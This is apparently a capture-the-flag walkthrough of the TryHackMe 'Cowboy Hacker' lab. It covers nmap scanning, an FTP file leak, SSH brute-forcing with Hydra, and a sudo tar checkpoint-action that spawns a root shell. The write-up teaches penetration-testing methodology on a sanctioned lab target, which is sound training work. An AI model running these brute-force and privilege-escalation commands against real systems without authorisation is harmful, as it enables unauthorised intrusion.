# TryHackMe — Cowboy Hacker

**Difficulty:** Easy  
**Target IP:** `10.10.81.11`  
**Platform:** [TryHackMe — Cowboy Hacker](https://tryhackme.com/room/cowboyhacker)

## 1. Initial Enumeration

The room is classified as **Easy** and provides a good introduction to basic enumeration, password cracking, SSH access, and Linux privilege escalation.

The first two questions have already been completed. Let's start with question #3 by enumerating the target machine.

First, we perform a full port scan using Nmap:

```bash
nmap -sC -sV -A -T4 -v -p- -oN scans/nmap.initial $IP
```

### Command breakdown

| Option | Description |
|---|---|
| `-sC` | Runs Nmap's default scripts |
| `-sV` | Detects service versions |
| `-A` | Enables aggressive detection, including OS detection and traceroute |
| `-T4` | Uses a faster timing template |
| `-v` | Enables verbose output |
| `-p-` | Scans all TCP ports (1–65535) |
| `-oN` | Saves results in normal Nmap format |
| `scans/nmap.initial` | Output file location |
| `$IP` | Target IP address stored in an environment variable |

### Open Ports

The scan reveals three open ports:

| Port | Service | Description |
|---|---|---|
| 21 | FTP | File Transfer Protocol |
| 22 | SSH | Secure Shell |
| 80 | HTTP | Web server |

We will start with the lowest-numbered port.

## 2. FTP Enumeration

We connect to the FTP service and discover two interesting files:

- `task.txt`
- `locks.txt`

The first file contains information that helps answer question #3, revealing the username `lin`.

The second file appears to contain a password list, which may be useful for password brute-forcing.

This gives us two important pieces of information:

- **Username:** `lin`
- **Potential password list:** `locks.txt`

## 3. SSH Brute Force

With a valid username and a potential password list, we can attempt to authenticate against the SSH service.

Although FTP could also be tested, our successful attack vector will be SSH.

We use Hydra:

```bash
hydra -l lin -P locks.txt ssh://$IP
```

### Command breakdown

| Option | Description |
|---|---|
| `hydra` | Password auditing and brute-force tool |
| `-l` | Specifies a single username |
| `lin` | Target username |
| `-P` | Specifies a password list |
| `locks.txt` | Password list obtained from FTP |
| `ssh://` | Specifies the SSH service |
| `$IP` | Target IP address |

**Important:** Pay attention to the uppercase `-P`. It tells Hydra to use a password list. Lowercase `-p` specifies a single password instead.

After a short time, Hydra successfully discovers valid SSH credentials:

```text
[22][ssh] host: 10.10.81.11
login: lin
password: Redacted
```

We now have valid credentials and can proceed to the next stage.

## 4. SSH Access — User Flag

Let's connect to the target using SSH:

```bash
ssh lin@$IP
```

After successfully authenticating, we obtain access to the system as the user `lin`.

The next step is to locate the user flag.

A common approach in Linux-based CTF machines is to search for files named `user.txt`.

We can use:

```bash
find / -name "user.txt" 2>/dev/null
```

### Command breakdown

| Component | Description |
|---|---|
| `find` | Searches for files and directories |
| `/` | Starts the search from the filesystem root |
| `-name` | Searches using an exact filename |
| `user.txt` | Filename we are looking for |
| `2>/dev/null` | Redirects error messages to `/dev/null` |

In this case, however, we could have simply used `ls` because the file was located in the current working directory.

We retrieve the flag:

```bash
cat user.txt
```

**User Flag:**

```text
THM{REDACTED}
```

With the user flag obtained, we can move on to privilege escalation.

## 5. Linux Privilege Escalation

Now that we have a foothold on the machine, we need to determine whether the current user has any permissions that could allow us to obtain root access.

We could use enumeration scripts such as LinPEAS, but first, let's perform a simple and important check:

```bash
sudo -l
```

This command lists the commands the current user is allowed to execute with `sudo`.

The output reveals that user `lin` can execute the `tar` binary with elevated privileges.

This is interesting because certain binaries can be abused to spawn a shell with elevated permissions.

### 5.1. Exploiting tar with GTFOBins

We consult [GTFOBins](https://gtfobins.github.io/gtfobins/tar/), a reference containing techniques for abusing Unix binaries in privilege escalation scenarios.

The `tar` entry provides a technique that uses checkpoint actions to execute arbitrary commands.

The following command can spawn a shell:

```bash
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Since we have permission to execute `tar` through `sudo`, we adapt the command:

```bash
sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

**How does it work?**

- `-cf /dev/null`: Creates an archive and sends its output to `/dev/null`.
- `--checkpoint=1`: Triggers a checkpoint after processing one archive record.
- `--checkpoint-action=exec=/bin/sh`: Executes `/bin/sh` when the checkpoint is reached.
- `sudo`: Runs the binary with elevated privileges.

The result is an interactive shell running with root privileges.

### 5.2. Confirming Root Access

To verify whether the privilege escalation was successful, execute:

```bash
id
```

If the output contains:

```text
uid=0(root) gid=0(root)
```

We have successfully obtained root access!

## 6. Root Flag

With root privileges, we can now access the root user's directory.

The root flag is commonly stored in `/root/root.txt`.

We can locate it with:

```bash
find / -name "root.txt" 2>/dev/null
```

The search reveals:

```text
/root/root.txt
```

Let's retrieve the flag:

```bash
cat /root/root.txt
```

**Root Flag:**

```text
THM{REDACTED}
```

---

## 7. What We Learned

This machine provided practical experience with several fundamental penetration testing techniques:

| Technique | Tool / Command | Purpose |
|---|---|---|
| Port scanning | Nmap | Identify exposed services |
| FTP enumeration | FTP client | Discover files and useful information |
| Password brute force | Hydra | Identify valid SSH credentials |
| Remote access | SSH | Obtain an initial foothold |
| File enumeration | `find` | Locate user and root flags |
| Privilege enumeration | `sudo -l` | Identify commands executable with elevated privileges |
| Linux privilege escalation | GTFOBins / `tar` | Obtain a root shell |

### Final Thoughts

Cowboy Hacker is a straightforward machine, but it reinforces an important penetration testing workflow:

**Enumeration → Information Gathering → Initial Access → Privilege Escalation → Root Access**

One important takeaway is that binaries available through `sudo` should always be investigated. A seemingly harmless utility such as `tar` can become a privilege escalation vector when its permitted functionality allows arbitrary command execution.

Another useful resource to keep bookmarked is [GTFOBins](https://gtfobins.github.io/), especially when investigating Linux privilege escalation opportunities.

**Machine completed!**
